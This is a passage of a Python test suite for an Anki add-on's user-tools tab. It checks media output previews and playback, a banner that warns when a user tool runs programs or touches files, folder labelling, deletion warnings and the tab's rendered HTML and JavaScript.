    alongside that line, under a SIBLING key — the text path and everything reading `output`
    are untouched.
    """

    def test_a_text_result_carries_no_media_block(self, controller):
        assert "media" not in _test_run(controller)

    def test_the_output_text_is_unchanged_for_a_text_tool(self, controller):
        # The regression lock: nesting the media under its own key is what keeps this true.
        assert _test_run(controller)["output"] == "mp3"

    def test_an_image_result_is_pushed_as_a_data_uri_with_its_name(self, controller):
        media = _test_run(controller, _media_tool("image", "jpg"))["media"]

        assert media["kind"] == "image"
        assert media["name"] == "ext.jpg"
        assert media["size"] == 8
        # The canonical type, not the `image/jpg` a bare f"image/{ext}" produces.
        assert media["image"].startswith("data:image/jpeg;base64,")

    def test_a_sound_result_is_playable_and_never_ships_its_bytes(self, controller):
        # This webview cannot decode AAC or H.264 at all, so audio goes to Anki's player and
        # nothing is marshalled into the page — which is also what keeps a 9 MB clip cheap.
        media = _test_run(controller, _media_tool("tts", "mp3"))["media"]

        assert media["kind"] == "audio"
        assert media["playable"] is True
        assert "image" not in media

    def test_a_video_result_is_reported_as_video(self, controller):
        # The EXTENSION decides, not the generation kind: nothing in GENERATION_KINDS says
        # "video", so a produced video can only ever arrive as tts with a video extension.
        media = _test_run(controller, _media_tool("tts", "mp4"))["media"]

        assert media["kind"] == "video"
        assert media["ext"] == "mp4"

    def test_a_large_image_reports_its_size_instead_of_a_preview(self, controller):
        from omnia.gui.smart_notes.dialogs.controllers.user_tools import (
            MAX_INLINE_PREVIEW_BYTES,
        )

        media = _test_run(
            controller, _media_tool("image", "png", MAX_INLINE_PREVIEW_BYTES + 1)
        )["media"]

        assert "image" not in media
        # Never a blank box: the name, the size and the reason are all still there.
        assert str(MAX_INLINE_PREVIEW_BYTES + 1) in media["note"]
        assert media["name"] == "ext.png"

    def test_playing_the_output_hands_the_bytes_to_ankis_player(
        self, controller, monkeypatch
    ):
        ctrl, _ctx, _pushed = controller
        played: list = []
        monkeypatch.setattr(
            "omnia.core.anki_compat.play_audio",
            lambda data, ext: played.append((data, ext)) or "",
        )
        _test_run(controller, _media_tool("tts", "mp3"))

        assert ctrl.on_play_output({}) == {"ok": True}
        assert played == [(b"x" * 8, "mp3")]

    def test_a_video_plays_through_the_same_player(self, controller, monkeypatch):
        # `play_audio` is not a misnomer here: av_player is Anki's video player too (it drives
        # the bundled mpv), and it is the only thing on the machine that decodes H.264.
        ctrl, _ctx, _pushed = controller
        played: list = []
        monkeypatch.setattr(
            "omnia.core.anki_compat.play_audio",
            lambda data, ext: played.append(ext) or "",
        )
        _test_run(controller, _media_tool("tts", "mp4"))
        ctrl.on_play_output({})

        assert played == ["mp4"]

    def test_playing_before_a_run_reports_instead_of_raising(self, controller):
        ctrl, _ctx, _pushed = controller

        assert "error" in ctrl.on_play_output({})

    def test_a_text_run_clears_a_previous_media_output(self, controller, monkeypatch):
        # Otherwise Play replays a run the user has already moved on from.
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr("omnia.core.anki_compat.play_audio", lambda data, ext: "")
        _test_run(controller, _media_tool("tts", "mp3"))
        _test_run(controller)

        assert "error" in ctrl.on_play_output({})

    def test_a_failed_run_clears_a_previous_media_output(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller, _media_tool("tts", "mp3"))

        ctrl.on_test({"slug": "ext", "source": "import socket\n", "inputs": {}})

        assert "error" in ctrl.on_play_output({})

    def test_disposing_forgets_the_last_output(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller, _media_tool("tts", "mp3"))

        ctrl.dispose()

        assert "error" in ctrl.on_play_output({})


class TestTheReviewIsToldWhatTheToolReaches:
    """The control that JUSTIFIES widening the allowlist has to actually ship.

    `risky_operations` was written as the compensating control for permitting os/subprocess —
    and for dropping `open` from the flagged calls — but nothing called it. The guard was
    loosened and the mitigation was not delivered: the review screen rendered exactly what it
    rendered before.
    """

    def test_a_file_touching_tool_says_so_in_the_payload(self, controller):
        _ctrl, _ctx, pushed = controller
        source = _TOOL_SOURCE.replace(
            "from typing import ClassVar",
            "import subprocess\nfrom pathlib import Path\nfrom typing import ClassVar",
        )
        assert "import subprocess" in source  # the substitution really happened

        _test_run(controller, source)

        payload = json.loads(
            pushed[-1].split("(", 1)[1].rsplit(");", 1)[0].split(", ", 1)[1]
        )
        assert "reads and writes files" in payload["risks"]
        assert "runs other programs on your computer" in payload["risks"]

    def test_a_text_only_tool_reports_no_risks(self, controller):
        # The banner appearing IS the signal, so a plain transform must not raise one.
        _ctrl, _ctx, pushed = controller

        _test_run(controller)

        payload = json.loads(
            pushed[-1].split("(", 1)[1].rsplit(");", 1)[0].split(", ", 1)[1]
        )
        assert payload["risks"] == []


class TestTheToolsFolderIsNeverHardcoded:
    """Where the tools live is derived, never written down — and shown as such.

    The absolute path was already correct on every platform (it comes from the installed
    package's own location), but the page inlined it into a sentence, so a runtime value read
    as a hardcoded macOS literal. The payload now carries a SHORT label for the sentence and
    keeps the absolute path for the tooltip and the Open-folder button.
    """

    def test_a_real_install_shows_the_short_relative_label(
        self, registry_guard, sync_background, tmp_path, monkeypatch
    ):
        # The real layout: the folder sits under the add-on root, so the label is the stable
        # `user_files/tools` — the same two words on macOS, Windows and Linux.
        addon_root = tmp_path / "addons21" / "123456"
        directory = addon_root / "user_files" / "tools"
        monkeypatch.setattr(
            "omnia.gui.smart_notes.dialogs.controllers.user_tools.addon_user_files_dir",
            lambda: addon_root / "user_files",
        )
        ctrl = UserToolsController(
            _fake_ctx(), loader=UserToolLoader(UserToolStore(directory))
        )

        payload = ctrl.on_list({})

        assert payload["directory_label"] == str(pathlib.Path("user_files") / "tools")
        # …while the absolute path rides along for the tooltip and the Open-folder button.
        assert payload["directory"] == str(directory)

    def test_a_folder_outside_the_addon_falls_back_to_the_absolute_path(
        self, controller, store
    ):
        # A layout the relative form cannot express (a test store, a hand-moved folder). The
        # honest answer is the full path, not a relative one that points somewhere else.
        ctrl, _ctx, _pushed = controller

        payload = ctrl.on_list({})

        assert payload["directory_label"] == str(store.directory)
        assert payload["directory"] == str(store.directory)

    def test_the_label_follows_the_folder_rather_than_naming_a_platform(
        self, registry_guard, sync_background, tmp_path
    ):
        # Two different install locations, neither of them written down anywhere: the label
        # tracks whatever folder the loader was built with.
        for where in ("addons21/12345/user_files/tools", "somewhere/else/tools"):
            directory = tmp_path / where
            ctrl = UserToolsController(
                _fake_ctx(), loader=UserToolLoader(UserToolStore(directory))
            )

            assert ctrl.on_list({})["directory"] == str(directory)

    def test_opening_the_folder_goes_through_the_cross_platform_seam(
        self, controller, store, monkeypatch
    ):
        # No `sys.platform` branch anywhere — Qt resolves Finder/Explorer/xdg-open itself.
        ctrl, _ctx, _pushed = controller
        opened: list[Any] = []
        monkeypatch.setattr(
            "omnia.core.anki_compat.open_local_path", lambda path: opened.append(path)
        )

        result = ctrl.on_open_dir({})

        assert result == {"ok": True}
        assert opened == [store.directory]
        assert (
            store.directory.is_dir()
        )  # created on demand, so the open cannot fail on it

    def test_a_failed_open_reports_instead_of_taking_the_tab_down(
        self, controller, monkeypatch
    ):
        ctrl, _ctx, _pushed = controller

        def boom(_path):
            raise RuntimeError("no file manager")

        monkeypatch.setattr("omnia.core.anki_compat.open_local_path", boom)

        result = ctrl.on_open_dir({})

        assert "no file manager" in result["error"]

    def test_the_op_is_routed(self, controller):
        # An op missing from this map is routed to None and fails SILENTLY, so this one-liner
        # is the only guard the Tools tab's ops have.
        ctrl, _ctx, _pushed = controller

        ops = ctrl.ops()

        assert "user_tool_open_dir" in ops
        assert "user_tool_inputs" in ops
        assert "user_tool_play_output" in ops


class TestDelete:
    def _settings_with_usage(self) -> SmartNotesSettings:
        return SmartNotesSettings(
            note_types=[
                SmartNotesNoteTypeConfig(
                    note_type="Vocab",
                    base_field="Word",
                    fields=[
                        SmartNotesFieldConfig(
                            field="Ext", tools=[FieldToolConfig(tool="user:ext")]
                        )
                    ],
                )
            ]
        )

    def test_delete_reports_the_referencing_fields_first(self, controller):
        ctrl, ctx, _pushed = controller
        ctx.settings = self._settings_with_usage
        _test_run(controller)
        ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": ""})

        result = ctrl.on_delete({"slug": "ext"})

        assert result["usages"] == ["Vocab · Ext"]
        assert result.get("ok") is None
        assert ctrl.on_list({})["tools"]  # nothing was deleted yet

    def test_confirming_deletes_the_file_and_unregisters_it(self, controller):
        ctrl, ctx, _pushed = controller
        ctx.settings = self._settings_with_usage
        _test_run(controller)
        ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": ""})

        result = ctrl.on_delete({"slug": "ext", "confirm": True})

        assert result["ok"] is True
        assert ctrl.on_list({})["tools"] == []
        assert get_tool("user:ext") is None

    def test_an_unused_tool_deletes_without_a_warning(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)
        ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": ""})

        result = ctrl.on_delete({"slug": "ext"})

        assert result["ok"] is True
        assert result["usages"] == []


class TestGenerate:
    def test_a_provider_failure_is_pushed_not_raised(self, controller):
        ctrl, ctx, pushed = controller

        class _Hub:
            @staticmethod
            def llm():
                class _LLM:
                    @staticmethod
                    def generate_text(*_a, **_kw):
                        raise RuntimeError("no key")

                return _LLM()

        ctx.build_hub = _Hub
        ctrl.on_generate({"slug": "ext", "prompt": "take the extension"})

        assert "__snUserToolSource" in pushed[-1]
        assert "no key" in pushed[-1]

    def test_the_generated_source_is_pushed_whole(self, controller):
        ctrl, ctx, pushed = controller
        code = '@register_tool("user:ext")\nclass T: pass\n'

        class _Hub:
            @staticmethod
            def llm():
                class _LLM:
                    @staticmethod
                    def generate_text(*_a, **_kw):
                        return code

                return _LLM()

        ctx.build_hub = _Hub
        ctrl.on_generate({"slug": "ext", "prompt": "take the extension"})

        assert "user:ext" in pushed[-1]

    def test_a_missing_description_is_refused_without_a_provider_call(self, controller):
        ctrl, ctx, _pushed = controller
        ctx.build_hub = lambda: None

        assert "Provider config error" in ctrl.on_generate({"slug": "ext"})["error"]


class TestToolsTabPage:
    """What only the built page can prove: the tab exists and says what it must."""

    def _html(self) -> str:
        return build_smart_notes_html(dark=False, init={}, catalog={}, tools=[])

    def test_the_tab_and_its_pane_are_rendered(self):
        html = self._html()

        assert 'data-tab="tools"' in html
        assert 'data-pane="tools"' in html

    def test_showtab_loads_the_tab_lazily(self):
        assert "loadUserTools();" in self._html()

    def test_the_page_states_that_tools_do_not_sync(self):
        html = self._html()

        assert "Anki does not sync them" in html
        assert "this computer" in html

    def test_save_starts_disabled(self):
        html = self._html()

        assert (
            'id="sn-ut-save" class="sn-btn sn-btn-primary" type="button" disabled'
            in html
        )

    def test_the_push_hooks_the_controller_calls_exist(self):
        html = self._html()

        assert "window.__snUserToolSource" in html
        assert "window.__snUserToolTested" in html

    def test_every_element_the_tab_script_grabs_is_in_the_page(self):
        # The page is ONE IIFE: a `getElementById` that returns null makes the very next
        # `addEventListener` throw, and the whole dialog (not just this tab) stops working.
        html = self._html()

        ids = re.findall(r'getElementById\("(sn-ut-[^"]+)"\)', html)

        assert ids, "the Tools tab script did not make it into the page"
        for element_id in ids:
            assert f'id="{element_id}"' in html, element_id

    def test_there_is_no_permanent_choose_file_button(self):
        # The panel used to carry one sample box and a Choose-file button whatever the tool
        # read. Asserted on the ID literals, which prose cannot accidentally satisfy.
        html = self._html()

        assert 'id="sn-ut-pick"' not in html
        assert 'id="sn-ut-sample"' not in html
        assert 'id="sn-ut-inputs"' in html

    def test_the_input_rows_are_rendered_into_the_container(self):
        render = _strip_js_comments(
            _js_function(self._html(), "function renderToolInputs(")
        )

        assert "utInputsEl.innerHTML" in render
        assert "toolInputRow(entry)" in render

    def test_a_media_row_asks_the_picker_for_its_field_and_kind(self):
        pick = _strip_js_comments(_js_function(self._html(), "function pickInputFile("))

        assert 'send("user_tool_pick_sample"' in pick
        assert "field: field" in pick
        assert "kind: kind" in pick

    def test_the_test_run_posts_one_value_per_input(self):
        run = _strip_js_comments(
            _js_function(self._html(), "function runUserToolTest(")
        )

        assert "inputs: collectToolInputs()" in run
        assert "sample" not in run

    def test_the_video_popup_plays_through_the_backend(self):
        # No <video> element anywhere: this webview cannot decode mp4/H.264 however the bytes
        # arrive, so the popup starts Anki's own player instead.
        popup = _strip_js_comments(
            _js_function(self._html(), "function openVideoPopup(")
        )
        play = _strip_js_comments(
            _js_function(self._html(), "function playToolOutput(")
        )

        assert "playToolOutput(" in popup
        assert 'send("user_tool_play_output"' in play
        assert 'createElement("video")' not in _strip_js_comments(self._html())

    def test_a_play_that_fails_says_so_inside_the_popup(self):
        # The default sink is the message under Run, which the popup's full-screen scrim covers:
        # the file would simply not play, with the reason hidden behind the popup naming it.
        popup = _strip_js_comments(
            _js_function(self._html(), "function openVideoPopup(")
        )

        assert "utVideoNote.textContent = error;" in popup

    def test_the_save_gate_is_still_armed_by_a_test_push(self):
        # The four load-bearing lines of the push hook, in order.
        hook = _strip_js_comments(
            _js_function(self._html(), "window.__snUserToolTested = function")
        )

        assert "utTestedSource = utSourceEl.value;" in hook
        assert "refreshSaveState();" in hook
        assert hook.index("utTestedSource = utSourceEl.value;") < hook.index(
            "refreshSaveState();"
        )

    def test_the_risk_banner_still_follows_the_push(self):
        hook = _strip_js_comments(
            _js_function(self._html(), "window.__snUserToolTested = function")
        )

        assert "showToolRisks(result.risks || [])" in hook
        assert (
            "showToolRisks([])" in hook
        )  # …and is cleared when the push carried an error

    def test_the_media_output_row_is_not_the_monospace_text_node(self):
        # `.sn-ut-out` is a pre-wrap monospace text box, which fights an icon + name + button
        # layout — so the produced file gets its own node rather than a restyle.
        css = _strip_css_comments(self._html())

        assert "pre-wrap" in _js(css, ".sn-ut-out {", 320)
        assert "pre-wrap" not in _js(css, ".sn-ut-outmedia {", 200)


@pytest.mark.skipif(_NODE is None, reason="node is needed to run the page's own JS")
class TestTheKindDecidesTheControlAndTheRendering:
    """The requirement itself, run rather than grepped.

    "One control per input, a file browser for a media one" and "output rendered BY KIND" are
    the two sentences this feature was asked for, and both live entirely in JavaScript. Greps
    over the built page cannot fail for the mutations that matter — deleting the ``text`` branch
    of ``toolInputRow`` or the ``video`` arm of ``renderToolOutput`` leaves every string an
    assertion was looking for exactly where it was. So the page's OWN functions are lifted out
    of the built HTML, given a minimal DOM, and asked what they build.
    """

    def test_a_text_input_is_a_box_to_type_in(self, rendered):
        row = rendered["text_row"]["dom"]

        boxes = _tags(row, "textarea")
        assert len(boxes) == 1
        assert boxes[0]["value"] == "hello"

    def test_a_text_input_can_still_be_handed_a_file(self, rendered):
        """The tolerance the removed standalone button used to provide, per input.

        A tool whose ``input_kinds`` cannot be read renders as ONE text row. Without an attach
        on the row itself there is no control anywhere on the panel that reaches the picker, and
        every media tool authored before the declaration existed becomes impossible to test.
        """
        assert ["pickInputFile", "Sentence", "file"] in rendered["text_row"]["calls"]

    def test_a_media_input_is_a_file_browser_and_not_a_box(self, rendered):
        row = rendered["audio_row"]["dom"]

        assert _tags(row, "textarea") == []
        buttons = _tags(row, "button")
        assert len(buttons) == 1
        assert "audio" in buttons[0]["text"]

    def test_a_media_pick_is_filtered_to_that_input_s_own_kind(self, rendered):
        assert ["pickInputFile", "Clip", "audio"] in rendered["audio_row"]["calls"]

    def test_a_staged_row_states_the_reference_and_the_file_behind_it(self, rendered):
        # "its Anki reference form is shown" is the requirement; the file name and the
        # outside-your-collection statement are what make the reference answerable.
        caption = _caption(rendered["staged_row"]["dom"])

        assert "[sound:take.wav]" in caption
        assert "take.wav" in caption
        assert "staged outside your collection" in caption

    def test_a_row_with_nothing_staged_says_nothing(self, rendered):
        assert _caption(rendered["audio_row"]["dom"]) == ""

    def test_a_rebuild_keeps_the_pick_and_still_reads_the_same(self, rendered):
        """The form is rebuilt on every debounced keystroke; a pick must survive that.

        And read the SAME afterwards: the two render paths disagreed, so one staged file was
        captioned with its name after a pick and with the raw reference after the next
        keystroke.
        """
        result = rendered["rebuild_keeps_the_pick"]

        assert result["value"] == "[sound:take.wav]"
        assert _caption(result["dom"]) == _caption(rendered["staged_row"]["dom"])

    def test_an_unchanged_declaration_does_not_replace_the_rows(self, rendered):
        """The form is re-fetched 300ms after every keystroke in the SOURCE box.

        Most edits do not touch ``input_kinds``, and rebuilding regardless replaced the rows
        under a user who had clicked into one — the values survive a rebuild, the caret does
        not. A declaration that really did change must still rebuild.
        """
        result = rendered["rebuild_only_when_the_form_changes"]

        assert result["kept"] is True
        assert result["rebuilt"] is True

    def test_a_produced_picture_is_a_name_and_a_way_to_view_it(self, rendered):
        result = rendered["image_output"]

        assert "🖼️" in _text(result["dom"])
        assert [button["text"] for button in _tags(result["dom"], "button")] == [
            "🔍 View"
        ]
        assert ["openLightbox", "data:image/png;base64,AA"] in result["calls"]

    def test_a_produced_sound_is_a_name_and_a_play_button(self, rendered):
        result = rendered["audio_output"]

        assert "🔊" in _text(result["dom"])
        assert [button["text"] for button in _tags(result["dom"], "button")] == [
            "🔊 Play"
        ]
        assert ["playToolOutput"] in result["calls"]

    def test_a_produced_video_opens_the_popup_that_plays_it(self, rendered):
        result = rendered["video_output"]

        assert "🎬" in _text(result["dom"])
        assert [button["text"] for button in _tags(result["dom"], "button")] == [
            "🎬 Open"
        ]
        assert ["openVideoPopup", "video"] in result["calls"]

    def test_a_file_with_no_viewer_here_is_still_named_and_explained(self, rendered):
        # Never a blank box: a picture too large to inline reports its size and why.
        result = rendered["unviewable_output"]

        assert _tags(result["dom"], "button") == []
        assert "too large to preview" in _text(result["dom"])
